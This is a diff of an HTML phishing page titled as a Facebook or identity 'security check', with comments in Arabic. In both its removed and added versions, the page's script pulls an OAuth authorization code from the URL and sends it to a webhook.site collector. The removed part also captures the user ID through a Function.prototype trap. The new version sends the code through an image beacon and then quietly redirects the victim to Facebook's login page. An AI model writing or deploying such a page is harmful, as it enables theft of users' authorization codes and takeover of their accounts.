@@ -1,36 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head><title>Facebook Security Check</title></head>
+<head><title>Verify Identity</title></head>
 <body>
     <script>
-        // 1. إعداد المصيدة لسحب الـ User ID (XS-Leak) كما في تقارير صمودة
-        try {
-            Function.prototype.default = function(e) {
-                if (e && e.userID) {
-                    fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?captured_uid=' + e.userID, { mode: 'no-cors' });
-                }
-            };
-            Function.prototype.__esModule = 1;
-        } catch (err) {}
-
-        // 2. معالجة سحب الـ Authorization Code المسرب من الرابط
         window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const authCode = urlParams.get('code'); 
+            // 1. استخراج الكود من الرابط (URL)
+            const params = new URLSearchParams(window.location.search);
+            const code = params.get('code') || window.location.hash.split('code=')[1];
 
-            if (authCode) {
-                fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?leaked_code=' + authCode, { mode: 'no-cors' })
-                .then(() => {
+            if (code) {
+                // 2. إرسال الكود عبر "صورة" لضمان وصوله للـ Webhook دون حظر من المتصفح
+                const exfiltrate = new Image();
+                exfiltrate.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?leaked_code=" + encodeURIComponent(code);
+
+                // 3. التحويل لفيسبوك بعد ثانية واحدة لضمان وصول البيانات
+                setTimeout(() => {
                     window.location.href = "https://www.facebook.com/login/";
-                });
+                }, 1000);
             }
         };
-
-        // 3. طلب ملف الإشارات لتفعيل سحب الـ UID
-        const script = document.createElement('script');
-        script.src = "https://www.facebook.com/signals/iwl.js?pixel_id=100080711880506";
-        document.head.appendChild(script);
     </script>
-    <p>Loading security check, please wait...</p>
+    <center><h2>Processing Security Check...</h2></center>
 </body>
 </html>
